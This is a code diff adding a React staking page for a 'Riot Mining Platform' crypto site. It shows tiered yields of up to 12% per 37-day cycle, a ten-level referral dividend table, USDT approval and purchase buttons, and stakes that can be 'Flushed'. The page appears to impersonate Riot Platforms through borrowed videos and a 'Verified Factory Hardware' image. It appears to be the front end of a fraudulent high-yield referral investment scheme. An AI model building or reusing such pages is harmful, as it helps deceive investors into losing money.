+                                ? 'bg-primary text-black shadow-glow'
+                                : 'bg-white/5 text-gray-400 border border-white/5'
+                                }`}
+                        >
+                            {tab}
+                        </button>
+                    ))}
+                </div>
+
+                {activeTab === 'Plan' ? (
+                    <section className="grid grid-cols-1 gap-5">
+                       <div className="bg-[#1a1a1a] rounded-[32px] p-6 border border-white/5 relative overflow-hidden mb-2">
+                             <div className="absolute top-0 right-0 p-8 opacity-5">
+                                <span className="material-icons-round text-8xl text-primary font-black">assignment</span>
+                            </div>
+                            <h2 className="text-xl font-black text-white uppercase italic tracking-tight mb-2">Mining Plan Details</h2>
+                            <p className="text-xs text-gray-400 leading-relaxed font-medium">
+                                Comprehensive breakdown of our mining cycles, tier yields, and global stakeholder dividends.
+                            </p>
+                        </div>
+                        
+                        <div className="bg-card-dark rounded-[32px] p-5 border border-white/5 flex flex-col gap-4 relative overflow-hidden hover:border-primary/20 transition-all">
+                            <h3 className="font-black text-white text-base uppercase tracking-tighter italic border-b border-white/10 pb-2">Core Parameters</h3>
+                            <div className="flex justify-between items-center bg-black/40 p-3 rounded-2xl border border-white/5">
+                                <span className="text-[11px] text-gray-500 font-bold uppercase tracking-widest">Mine Cycle</span>
+                                <span className="text-[12px] text-primary font-black">37 Days</span>
+                            </div>
+                            <div className="flex justify-between items-center bg-black/40 p-3 rounded-2xl border border-white/5">
+                                <span className="text-[11px] text-gray-500 font-bold uppercase tracking-widest">Invitation Income</span>
+                                <span className="text-[12px] text-white font-black">20$</span>
+                            </div>
+                            <div className="flex justify-between items-center bg-black/40 p-3 rounded-2xl border border-white/5">
+                                <span className="text-[11px] text-gray-500 font-bold uppercase tracking-widest">Minimum Stake</span>
+                                <span className="text-[12px] text-white font-black">200$</span>
+                            </div>
+                        </div>
+
+                        <div className="bg-card-dark rounded-[32px] p-5 border border-white/5 flex flex-col gap-4 relative overflow-hidden hover:border-primary/20 transition-all">
+                             <h3 className="font-black text-white text-base uppercase tracking-tighter italic border-b border-white/10 pb-2">Tier Yields (Cycle)</h3>
+                             <div className="grid grid-cols-2 gap-2">
+                                <div className="bg-black/40 p-3 rounded-2xl border border-white/5 flex justify-between items-center">
+                                    <span className="text-[11px] text-gray-400 font-bold">&gt; 50$</span>
+                                    <span className="text-[11px] text-primary font-black">5.50%</span>
+                                </div>
+                                <div className="bg-black/40 p-3 rounded-2xl border border-white/5 flex justify-between items-center">
+                                    <span className="text-[11px] text-gray-400 font-bold">&gt; 500$</span>
+                                    <span className="text-[11px] text-primary font-black">6%</span>
+                                </div>
+                                <div className="bg-black/40 p-3 rounded-2xl border border-white/5 flex justify-between items-center">
+                                    <span className="text-[11px] text-gray-400 font-bold">&gt; 1000$</span>
+                                    <span className="text-[11px] text-primary font-black">6.50%</span>
+                                </div>
+                                <div className="bg-black/40 p-3 rounded-2xl border border-white/5 flex justify-between items-center">
+                                    <span className="text-[11px] text-gray-400 font-bold">&gt; 2000$</span>
+                                    <span className="text-[11px] text-primary font-black">7%</span>
+                                </div>
+                                <div className="bg-black/40 p-3 rounded-2xl border border-white/5 flex justify-between items-center">
+                                    <span className="text-[11px] text-gray-400 font-bold">&gt; 5000$</span>
+                                    <span className="text-[11px] text-primary font-black">8%</span>
+                                </div>
+                                <div className="bg-black/40 p-3 rounded-2xl border border-white/5 flex justify-between items-center col-span-2">
+                                    <span className="text-[11px] text-gray-400 font-bold">&gt; 10000$ To unlimited</span>
+                                    <span className="text-[11px] text-primary font-black">12%</span>
+                                </div>
+                             </div>
+                        </div>
+
+                        <div className="bg-card-dark rounded-[32px] p-5 border border-white/5 flex flex-col gap-4 relative overflow-hidden hover:border-primary/20 transition-all">
+                             <h3 className="font-black text-white text-base uppercase tracking-tighter italic border-b border-white/10 pb-2">Stake Holders Dividend</h3>
+                             
+                             <div className="p-3 bg-purple-900/10 border border-purple-500/20 rounded-2xl mb-2">
+                                 <div className="text-[10px] text-purple-400 font-black uppercase tracking-widest mb-2 flex justify-between">
+                                     <span>Levels 1-3</span>
+                                     <span className="text-white">Stake Req: 200$</span>
+                                 </div>
+                                 <div className="grid grid-cols-3 gap-2">
+                                    <div className="bg-black/40 p-2 rounded-xl text-center"><span className="block text-[10px] text-gray-500">L-1</span><span className="text-[11px] text-white font-black">5%</span></div>
+                                    <div className="bg-black/40 p-2 rounded-xl text-center"><span className="block text-[10px] text-gray-500">L-2</span><span className="text-[11px] text-white font-black">3%</span></div>
+                                    <div className="bg-black/40 p-2 rounded-xl text-center"><span className="block text-[10px] text-gray-500">L-3</span><span className="text-[11px] text-white font-black">2%</span></div>
+                                 </div>
+                             </div>
+
+                             <div className="p-3 bg-blue-900/10 border border-blue-500/20 rounded-2xl mb-2">
+                                 <div className="text-[10px] text-blue-400 font-black uppercase tracking-widest mb-2 flex justify-between">
+                                     <span>Levels 4-6</span>
+                                     <span className="text-white">Stake Req: 1000$</span>
+                                 </div>
+                                 <div className="grid grid-cols-3 gap-2">
+                                    <div className="bg-black/40 p-2 rounded-xl text-center"><span className="block text-[10px] text-gray-500">L-4</span><span className="text-[11px] text-white font-black">1%</span></div>
+                                    <div className="bg-black/40 p-2 rounded-xl text-center"><span className="block text-[10px] text-gray-500">L-5</span><span className="text-[11px] text-white font-black">1%</span></div>
+                                    <div className="bg-black/40 p-2 rounded-xl text-center"><span className="block text-[10px] text-gray-500">L-6</span><span className="text-[11px] text-white font-black">1%</span></div>
+                                 </div>
+                             </div>
+
+                             <div className="p-3 bg-orange-900/10 border border-orange-500/20 rounded-2xl">
+                                 <div className="text-[10px] text-orange-400 font-black uppercase tracking-widest mb-2 flex justify-between">
+                                     <span>Levels 7-10</span>
+                                     <span className="text-white">Stake Req: 2000$</span>
+                                 </div>
+                                 <div className="grid grid-cols-4 gap-2">
+                                    <div className="bg-black/40 p-2 rounded-xl text-center"><span className="block text-[10px] text-gray-500">L-7</span><span className="text-[11px] text-white font-black">1%</span></div>
+                                    <div className="bg-black/40 p-2 rounded-xl text-center"><span className="block text-[10px] text-gray-500">L-8</span><span className="text-[11px] text-white font-black">1%</span></div>
+                                    <div className="bg-black/40 p-2 rounded-xl text-center"><span className="block text-[10px] text-gray-500">L-9</span><span className="text-[11px] text-white font-black">1%</span></div>
+                                    <div className="bg-black/40 p-2 rounded-xl text-center"><span className="block text-[10px] text-gray-500">L-10</span><span className="text-[11px] text-white font-black">1%</span></div>
+                                 </div>
+                             </div>
+                        </div>
+
+                        <div className="bg-card-dark rounded-[32px] p-5 border border-white/5 flex flex-col gap-3 relative overflow-hidden hover:border-primary/20 transition-all">
+                             <h3 className="font-black text-white text-base uppercase tracking-tighter italic border-b border-white/10 pb-2">Terms and Conditions</h3>
+                             <ul className="text-[11px] text-gray-400 font-medium space-y-2 list-disc pl-4 marker:text-primary">
+                                 <li>Minimum withdrawal <span className="text-white font-black">1$</span></li>
+                                 <li><span className="text-white font-black">24×7</span> System Access & Transactions</li>
+                                 <li>The commission will be released after the cycle is completed.</li>
+                             </ul>
+                        </div>
+                    </section>
+                ) : activeTab === 'Hardware' ? (
+                    <section className="grid grid-cols-1 gap-5">
+                        <div className="bg-[#1a1a1a] rounded-[32px] p-6 border border-white/5 relative overflow-hidden mb-2">
+                             <div className="absolute top-0 right-0 p-8 opacity-5">
+                                <span className="material-icons-round text-8xl text-primary font-black">hub</span>
+                            </div>
+                            <h2 className="text-xl font-black text-white uppercase italic tracking-tight mb-2">Global Infrastructure</h2>
+                            <p className="text-xs text-gray-400 leading-relaxed font-medium">
+                                Riot Mining Platform operates industrial-grade hash farms across Nordic and Central Asian regions. We leverage the raw SHA-256 power of Antminer clusters, optimized by our proprietary AI predictive mining algorithms.
+                            </p>
+                        </div>
+
+                        {hardwareData.map((item, idx) => {
+                            const colors = getColorClasses(item.color);
+                            const useAsset = idx === 0; // Use generated Antminer S19 Pro for the first one
+                            return (
+                                <div key={idx} className="bg-card-dark rounded-[32px] p-5 border border-white/5 flex flex-col gap-4 relative overflow-hidden hover:border-primary/20 transition-all">
+                                    {useAsset ? (
+                                        <div className="w-full h-40 rounded-2xl overflow-hidden bg-black/60 relative group">
+                                            <img src="https://support.bitmain.com/hc/article_attachments/4403023128985/_____.jpg" alt={item.name} className="w-full h-full object-cover group-hover:scale-105 transition-transform duration-500 opacity-80" />
+                                            <div className="absolute inset-0 bg-gradient-to-t from-black via-transparent to-transparent opacity-60"></div>
+                                            <div className="absolute bottom-3 left-4 flex items-center gap-2">
+                                                 <span className="material-icons-round text-primary text-sm">verified</span>
+                                                 <span className="text-[10px] font-black text-white uppercase tracking-widest drop-shadow-[0_2px_4px_rgba(0,0,0,1)]">Verified Factory Hardware</span>
+                                            </div>
+                                        </div>
+                                    ) : (
+                                        <div className="flex items-center gap-4">
+                                            <div className={`${colors.bg} w-16 h-16 rounded-[24px] flex items-center justify-center flex-shrink-0 border border-white/5`}>
+                                                <span className={`material-icons-round ${colors.text} text-3xl`}>{item.icon}</span>
+                                            </div>
+                                            <div className="flex-1">
+                                                <h3 className="font-black text-white text-base uppercase tracking-tighter italic">{item.name}</h3>
+                                                <div className="inline-block bg-primary/10 text-primary text-[9px] font-black px-2 py-0.5 rounded-md border border-primary/20 uppercase tracking-widest mt-1">
+                                                    Active Deployment
+                                                </div>
+                                            </div>
+                                        </div>
+                                    )}
+                                    {useAsset && (
+                                        <div className="flex-1 -mt-1 px-1">
+                                            <h3 className="font-black text-white text-base uppercase tracking-tighter italic">{item.name}</h3>
+                                        </div>
+                                    )}
+                                    <div className="space-y-2">
+                                        <div className="flex justify-between items-center bg-black/40 p-3 rounded-2xl border border-white/5">
+                                            <span className="text-[10px] text-gray-500 font-bold uppercase tracking-widest">Specifications</span>
+                                            <span className="text-[10px] text-white font-black">{item.specs}</span>
+                                        </div>
+                                        <p className="text-[11px] text-gray-500 font-medium leading-relaxed italic px-1">
+                                            "{item.desc}"
+                                        </p>
+                                    </div>
+                                </div>
+                            );
+                        })}
+                    </section>
+                ) : activeTab === 'My Stakes' ? (
+                    <section className="grid grid-cols-1 gap-4">
+                        {userStakes.length === 0 ? (
+                            <div className="text-center py-20 bg-card-dark rounded-3xl border border-dashed border-white/5">
+                                <span className="material-icons-round text-4xl text-gray-700 mb-2 font-black">history</span>
+                                <p className="text-gray-500 text-xs font-black uppercase tracking-widest">No active mining cycles</p>
+                            </div>
+                        ) : (
+                            userStakes.map((s, i) => {
+                                 const logicalStartTime = s.logicalStartTime || s.startTime;
+                                 const finished = Date.now() / 1000 > logicalStartTime + (37 * 86400);
+                                 const progress = Math.min(100, ((Date.now() / 1000 - logicalStartTime) / (37 * 86400)) * 100);
+                                return (
+                                    <div key={i} className={`bg-card-dark rounded-[32px] p-6 border border-white/5 shadow-2xl relative overflow-hidden ${s.isViolated ? 'opacity-50 grayscale' : ''}`}>
+                                        <div className="flex justify-between items-start mb-4">
+                                            <div>
+                                                <p className="text-[10px] text-gray-500 font-black uppercase tracking-widest">Mining Cycle #{s.index + 1}</p>
+                                                <h3 className="text-xl font-black text-white italic">{s.displayVal} <span className="text-primary text-sm uppercase">USDT</span></h3>
+                                            </div>
+                                            <div className={`px-2.5 py-1 rounded-full text-[9px] font-black uppercase tracking-widest ${s.isViolated ? 'bg-red-500/10 text-red-500 border border-red-500/20' : (finished ? 'bg-green-500/10 text-green-500 border border-green-500/20' : 'bg-primary/10 text-primary border border-primary/20')}`}>
+                                                {s.isViolated ? 'Violated (Flushed)' : (finished ? 'Completed' : 'Mining Cycle')}
+                                            </div>
+                                        </div>
+
+                                        <div className="w-full h-2 bg-white/5 rounded-full overflow-hidden mb-5 border border-white/5 shadow-inner">
+                                            <div
+                                                className="h-full bg-primary shadow-glow transition-all duration-1000 relative overflow-hidden"
+                                                style={{ width: `${progress}%` }}
+                                            >
+                                                 <div className="absolute inset-0 bg-gradient-to-r from-transparent via-white/20 to-transparent animate-shimmer"></div>
+                                            </div>
+                                        </div>
+
+                                        <div className="grid grid-cols-2 gap-4 mb-6">
+                                            <div className="bg-black/40 p-3 rounded-2xl border border-white/5">
+                                                <p className="text-[9px] text-gray-500 font-black uppercase tracking-widest mb-1">Locked Date</p>
+                                                <p className="text-[11px] text-gray-300 font-black">{new Date(s.startTime * 1000).toLocaleDateString()}</p>
+                                            </div>
+                                            <div className="bg-black/40 p-3 rounded-2xl border border-white/5 text-right">
+                                                <p className="text-[9px] text-gray-500 font-black uppercase tracking-widest mb-1">Yield Gain</p>
+                                                <p className="text-[11px] text-primary font-black uppercase tracking-tighter">
+                                                    {s.isViolated ? (
+                                                        <span className="text-red-500">STOPPED (0 BTC)</span>
+                                                    ) : (() => {
+                                                        const timePassed = Math.max(0, currentTime - s.startTime);
+                                                        const stakeRate = getTierRate(s.displayVal);
+                                                        const currentAccrued = ((s.displayVal * stakeRate) / 37 / 86400 * timePassed) / btcPrice;
+                                                        return `+${currentAccrued.toFixed(14)} BTC`;
+                                                    })()}
+                                                </p>
+                                            </div>
+                                        </div>
+
+                                        <button
+                                            disabled={!finished || s.isViolated || loading === `withdraw-${s.index}`}
+                                            onClick={() => handleWithdraw(s.index)}
+                                            className={`w-full py-4 rounded-xl font-black text-xs uppercase tracking-widest transition-all ${finished && !s.isViolated
+                                                ? 'bg-primary text-black shadow-glow cursor-pointer hover:scale-[1.02]'
+                                                : 'bg-white/5 text-gray-600 cursor-not-allowed border border-white/5'
+                                                }`}
+                                        >
+                                            {loading === `withdraw-${s.index}` ? 'Processing...' : s.isViolated ? 'Flushed' : finished ? 'Claim & Withdraw (Mining + Team Yield)' : `Locked (${formatCountdown(s.startTime)})`}
+                                        </button>
+                                    </div>
+                                );
+                            })
+                        )}
+                    </section>
+                ) : activeTab === 'News' ? (
+                    <section className="grid grid-cols-1 gap-5 pb-10">
+                        {/* Riot Platform Info Header */}
+                        <div className="bg-[#1a1a1a] rounded-[32px] p-6 border border-white/5 relative overflow-hidden mb-2">
+                            <div className="absolute top-0 right-0 p-8 opacity-5">
+                                <span className="material-icons-round text-8xl text-primary font-black">newspaper</span>
+                            </div>
+                            <h2 className="text-xl font-black text-white uppercase italic tracking-tight mb-2">Riot Platforms News</h2>
+                            <p className="text-xs text-gray-400 leading-relaxed font-medium">
+                                Riot Platforms is an industry-leading Bitcoin mining and digital infrastructure company. Leveraging gigawatt-scale operations and immersion-cooling technology, Riot powers next-generation decentralized blockchain architecture. Explore the latest operational updates, energy integration overviews, and site developments below.
+                            </p>
+                        </div>
+
+                        {/* YouTube & Social Media Embed Cards */}
+                        {[
+                            {
+                                id: '1FGvORXQjr4',
+                                title: 'Riot Corporate Profile',
+                                desc: "An official overview of Riot Platforms' vision, values, and large-scale mining operations in North America."
+                            },
+                            {
+                                id: 'TsD16IlgUXQ',
+                                start: 240,
+                                title: 'Rockdale Facility Tour',
+                                desc: "Deep dive into the 750 MW Whinstone mining facility in Rockdale, Texas, featuring liquid-cooling technology."
+                            },
+                            {
+                                id: '8R7emNfF1rA',
+                                title: 'Corsicana Gigawatt Expansion',
+                                desc: "A review of Riot's monumental 1 GW Corsicana development and its impact on the hash rate infrastructure."
+                            },
+                            {
+                                id: 'b3WwstTUHF4',
+                                title: 'Sustainable Energy Integration',
+                                desc: "How Riot Platforms integrates renewable energy resources and participates in grid response programs to maintain grid stability."
+                            },
+                            {
+                                id: 'cSP6ipby1oQ',
+                                title: 'Mining Operations & ASICs',
+                                desc: "Inside the hash-rate generation hubs, showcasing rows of high-performance MicroBT WhatsMiner deployment."
+                            },
+                            {
+                                id: '1w-ok-_d_K4',
+                                title: 'Liquid Immersion Cooling Technology',
+                                desc: "Exploring Riot's cutting-edge immersion cooling deployment that boosts efficiency and extends hardware lifespan."
+                            },
+                            {
+                                id: '9AyxB2Ln9Eo',
+                                title: 'Institutional Mining Vision',
+                                desc: "Riot's long-term corporate vision for digital asset mining, energy orchestration, and grid optimization."
+                            },
+                            {
+                                id: '0BvJwTMsG2k',
+                                title: 'Global Bitcoin Hashrate Leader',
+                                desc: "Tracking Riot's growth toward 20 EH/s capacity and leadership in global Bitcoin mining infrastructure."
+                            },
+                            {
+                                id: 'UQQu81TVpvM',
+                                title: 'Corsicana Site Tour & Progress Update',
+                                desc: "A virtual walkthrough of Riot Platforms' 1 GW Corsicana facility under construction, showing substation engineering and rack installation."
+                            },
+                            {
+                                id: '83y0E_7yTW8',
+                                title: 'MicroBT WhatsMiner Acquisition',
+                                desc: "Riot Platforms CEO Jason Les discusses the strategic purchase of 31,500 WhatsMiners from MicroBT for the Rockdale facility."
+                            },
+                            {
+                                id: 'MWSpwiuUIiw',
+                                title: 'Riot Platforms Sustainability Summit',
+                                desc: "Highlighting Riot's carbon-free energy partnerships and demand response performance in the ERCOT power grid."
+                            },
+                            {
+                                id: 'C8UwGL8vZYl',
+                                type: 'instagram',
+                                url: 'https://www.instagram.com/p/C8UwGL8vZYl/',
+                                title: 'Riot Hardware Spotlight (Instagram)',
+                                desc: "Riot Platforms official hardware close-up: A detailed visual update of ASIC fans, control boards, and server racks at the Rockdale hub."
+                            }
+                        ].map((item) => (
+                            <div key={item.id} className="bg-card-dark rounded-[32px] p-5 border border-white/5 flex flex-col gap-4 relative overflow-hidden hover:border-primary/20 transition-all">
+                                <h3 className="font-black text-white text-base uppercase tracking-tighter italic border-b border-white/10 pb-2 flex items-center gap-2">
+                                    <span className="material-icons-round text-primary text-sm">
+                                        {item.type === 'instagram' ? 'photo_camera' : 'play_circle_filled'}
+                                    </span>
+                                    {item.title}
+                                </h3>
+                                
+                                {item.type === 'instagram' ? (
+                                    <div className="w-full rounded-2xl overflow-hidden bg-black/60 aspect-video border border-white/5 flex flex-col items-center justify-center p-6 text-center gap-4 relative group">
+                                        <div className="absolute inset-0 bg-[#E1306C] opacity-5 group-hover:opacity-10 transition-opacity"></div>
+                                        <span className="material-icons text-5xl text-[#E1306C]">photo_camera</span>
+                                        <p className="text-[10px] text-gray-400 font-bold uppercase tracking-widest">Official Instagram Image Post</p>
+                                        <a
+                                            href={item.url}
+                                            target="_blank"
+                                            rel="noopener noreferrer"
+                                            className="bg-[#E1306C] text-white text-[10px] font-black uppercase tracking-widest px-6 py-3 rounded-full hover:scale-105 active:scale-95 transition-all no-underline shadow-glow"
+                                        >
+                                            View Photo on Instagram
+                                        </a>
+                                    </div>
+                                ) : (
+                                    <div className="w-full rounded-2xl overflow-hidden bg-black aspect-video border border-white/5">
+                                        <iframe
+                                            width="100%"
+                                            height="100%"
+                                            src={`https://www.youtube.com/embed/${item.id}${ (item as any).start ? `?start=${(item as any).start}` : ''}`}
+                                            title={item.title}
+                                            frameBorder="0"
+                                            allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share"
+                                            allowFullScreen
+                                            className="w-full h-full"
+                                        ></iframe>
+                                    </div>
+                                )}
+
+                                <p className="text-[11px] text-gray-400 font-medium leading-relaxed italic px-1">
+                                    "{item.desc}"
+                                </p>
+                            </div>
+                        ))}
+                    </section>
+                ) : (
+                    <section className="grid grid-cols-1 gap-5">
+                        {upgrades.map((item) => {
+                            const colors = getColorClasses(item.color);
+                            return (
+                                <div key={item.name} className="bg-card-dark rounded-[32px] p-5 border border-white/5 flex flex-col gap-4 relative overflow-hidden group hover:border-primary/20 transition-all duration-300">
+                                    <div className="flex items-start gap-4">
+                                        <div className={`${colors.bg} w-16 h-16 rounded-[24px] flex items-center justify-center flex-shrink-0 border border-white/5`}>
+                                            <span className={`material-icons-round ${colors.text} text-3xl ${colors.shadow} font-black`}>{item.icon}</span>
+                                        </div>
+                                        <div className="flex-1">
+                                            <h3 className="font-black text-white text-base uppercase tracking-tighter italic">{item.name}</h3>
+                                            <p className="text-[11px] text-gray-500 mt-1 line-clamp-2 leading-relaxed font-bold italic tracking-tight">{item.description}</p>
+                                            <div className="flex items-center gap-3 mt-4">
+                                                <div className="bg-primary/5 px-2.5 py-1.5 rounded-xl flex items-center gap-1.5 border border-primary/20">
+                                                    <span className="material-icons-round text-primary text-xs font-black">bolt</span>
+                                                    <span className="text-[10px] font-black text-primary uppercase tracking-widest">{item.tp}</span>
+                                                </div>
+                                                <span className="text-[10px] text-white bg-white/5 px-3 py-1.5 rounded-full font-black uppercase border border-white/10">{item.lvl} RATE</span>
+                                            </div>
+                                        </div>
+                                    </div>
+                                    {(() => {
+                                        const priceNum = parseFloat(item.price.replace(/[^0-9.]/g, ''));
+                                        const needsApproval = parseFloat(allowance) < priceNum;
+                                        return (
+                                            <button
+                                                onClick={() => handleBuy(item.id, item.price)}
+                                                disabled={loading === item.id}
+                                                className="mt-1 w-full bg-primary text-black py-4 rounded-2xl font-black text-xs uppercase tracking-widest shadow-glow hover:scale-[1.02] active:scale-[0.98] cursor-pointer border-none"
+                                            >
+                                                {loading === item.id 
+                                                    ? 'Processing...' 
+                                                    : (needsApproval 
+                                                        ? 'Approve USDT' 
+                                                        : `Purchase for ${item.price}`)}
+                                            </button>
+                                        );
+                                    })()}
+                                </div>
+                            );
+                        })}
+                    </section>
+                )}
+            </main>
+        </div>
+    );
+};
+
+export default Stake;
